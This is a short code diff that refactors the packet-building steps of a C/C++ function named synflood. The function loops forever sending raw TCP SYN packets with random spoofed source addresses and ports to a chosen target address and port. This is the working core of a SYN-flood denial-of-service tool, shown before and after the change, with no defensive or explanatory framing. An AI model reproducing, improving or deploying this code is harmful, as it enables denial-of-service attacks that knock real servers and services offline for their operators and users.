@@ -11,24 +11,8 @@ void synflood(in_addr_t addr, port_t port)
     TCP_IP_RawSocket sd;
 
     while(1) {
-        struct iphdr ip;
-        memset(&ip, 0, sizeof ip);
-        struct tcphdr tcp;
-        memset(&tcp, 0, sizeof tcp);
-
-        ip.version = 4;
-        ip.ttl = 64;
-        ip.saddr = random();
-        ip.daddr = addr;
-        sd.build_IP_header(ip);
-
-        tcp.source = random()%65535+1;
-        tcp.dest = port;
-        tcp.seq = 1;
-        tcp.window = 1024*(random()%4+1);
-        tcp.syn = 1;
-        sd.build_TCP_header(tcp);
-
+        sd.build_IP_header(random(), addr);
+        sd.build_TCP_header(random()%65535+1, port, 1, 0, 1024*(random()%4+1), 0, 1);
         sd.adjust_TCP_IP_all();
 
         sd.send_packet(addr);
